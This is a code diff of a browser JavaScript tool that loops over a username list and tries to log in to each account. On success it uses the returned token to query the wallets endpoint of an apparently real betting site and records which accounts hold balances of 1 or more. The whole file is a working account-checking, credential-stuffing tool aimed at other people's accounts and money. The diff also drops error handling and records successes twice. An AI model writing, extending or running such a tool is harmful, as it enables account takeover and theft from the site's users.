@@ -5,7 +5,7 @@ function fetchUsernamesFromProcessedList() {
     const wordListContainer = document.getElementById('wordListContainer');
     const usernames = [];
     if (wordListContainer) {
-        wordListContainer.querySelectorAll('.word-item').forEach(div => {
+        wordListContainer.querySelectorAll('.col.border').forEach(div => {
             usernames.push(div.textContent.trim());
         });
     }
@@ -38,82 +38,66 @@ async function tryLogin(username) {
         return;
     }
 
-    if (loginResponse.ok && loginResult.access_token) {
+    if (loginResponse.ok) {
         await fetchWalletDetails(loginResult.access_token, username);
     } else {
         console.log(`Login failed: ${username}`);
     }
 }
-
 async function fetchWalletDetails(token, username) {
     if (stopRequested) return;
 
-    try {
-        const response = await fetch(
-            "https://feapi.sharky777.xyz/api/member/wallets",
-            {
-                method: "GET",
-                headers: {
-                    Authorization: `Bearer ${token}`,
-                },
-            }
-        );
-
-        const result = await response.json();
-
-        if (response.ok && result.data && result.data.wallets) {
-            const wallets = result.data.wallets.map(wallet => ({
-                code: wallet.wallet_code,
-                balance: wallet.balance,
-            }));
-            displaySuccessResponse(username, wallets);
-
-            // Append wallets with balance >= 1
-            const tableBody = document.getElementById("tableBody");
-            wallets.forEach(wallet => {
-                if (parseFloat(wallet.balance) >= 1) {
-                    const tr = document.createElement('tr');
-                    const formattedBalance = parseFloat(wallet.balance).toFixed(2);
-                    tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${formattedBalance}</td>`;
-                    tableBody.appendChild(tr);
-                }
-            });
-
-            // Save successful login
-            successfulLogins.push({ username, wallets });
-        } else {
-            console.log(`Failed to fetch wallets for ${username}`);
-        }
-    } catch (error) {
-        console.log(`Error fetching wallet details for ${username}:`, error);
+    const response = await fetch(
+        "https://feapi.sharky777.xyz/api/member/wallets", {
+        method: "GET",
+        headers: {
+            Authorization: `Bearer ${token}`
+        },
     }
-}
-
-function displaySuccessResponse(username, wallets) {
-    // Save username to successful logins
-    successfulLogins.push({ username, wallets });
-    // Save to localStorage as comma-separated list of usernames
-    localStorage.setItem(
-        'success',
-        successfulLogins.map(u => u.username).join(',')
     );
 
-    const successOutput = document.getElementById("successOutput");
-    let ol = successOutput.querySelector('ol');
-    if (!ol) {
-        ol = document.createElement('ol');
-        successOutput.innerHTML = '';
-        successOutput.appendChild(ol);
+    const result = await response.json();
+    if (response.ok) {
+        const wallets = result.data.wallets.map((wallet) => ({
+            code: wallet.wallet_code,
+            balance: wallet.balance
+        }));
+        displaySuccessResponse(username, wallets);
+
+        const tableBody = document.getElementById("tableBody");
+        wallets.forEach(wallet => {
+            if (parseFloat(wallet.balance) >= 1) {
+                const tr = document.createElement('tr');
+                // Show balance as integer
+                const intBalance = parseInt(wallet.balance, 10);
+                tr.innerHTML = `<td>${username}</td><td>${wallet.code}</td><td>${intBalance}</td>`;
+                tableBody.appendChild(tr);
+            }
+        });
+
+        successfulLogins.push({
+            username,
+            wallets
+        });
     }
-    const li = document.createElement('li');
-    li.textContent = username;
-    ol.appendChild(li);
 }
 
-function createUserBalanceDiv(username, balance) {
+function displaySuccessResponse(username) {
+    successfulLogins.push(username);
+    localStorage.setItem('success', successfulLogins.map(u => typeof u === 'string' ? u : u.username).join(','));
+    const successOutput = document.getElementById("successOutput");
+    const div = document.createElement('div');
+    div.classList.add("col");
+    div.classList.add("border");
+    div.textContent = username;
+    successOutput.appendChild(div);
+}
+function createUserBalanceDiv(username, code, balance) {
     const tableBody = document.getElementById("tableBody");
+    // Remove decimals, show as integer
+    const intBalance = parseInt(balance, 10);
     const tr = document.createElement('tr');
-    tr.innerHTML = `<td>${username}</td><td>${balance}</td>`;
+    tr.innerHTML = `<td>${username}</td><td>${code}</td><td>${intBalance}</td>`;
     tableBody.appendChild(tr);
 }
 
@@ -121,7 +105,7 @@ const mainButton = document.getElementById('mainButton');
 const stopButton = document.getElementById('stopButton');
 
 mainButton.addEventListener('click', () => {
-    processLoginFile();
+    processLoginFile()
 });
 
 stopButton.addEventListener('click', () => {
@@ -132,21 +116,21 @@ async function processLoginFile() {
     stopRequested = false;
     successfulLogins = [];
     const usernames = fetchUsernamesFromProcessedList();
-
     for (const username of usernames) {
         if (stopRequested) {
             console.log("STOPPED");
-            alert("Stopped by user");
+            alert("STOPPED");
             return;
         }
         try {
             await tryLogin(username);
         } catch (error) {
-            console.log(`Error processing ${username}:`, error);
+            console.log(error);
         }
     }
     alert("Login process finished!");
 }
+
 
 function stopLoginAttempts() {
     stopRequested = true;
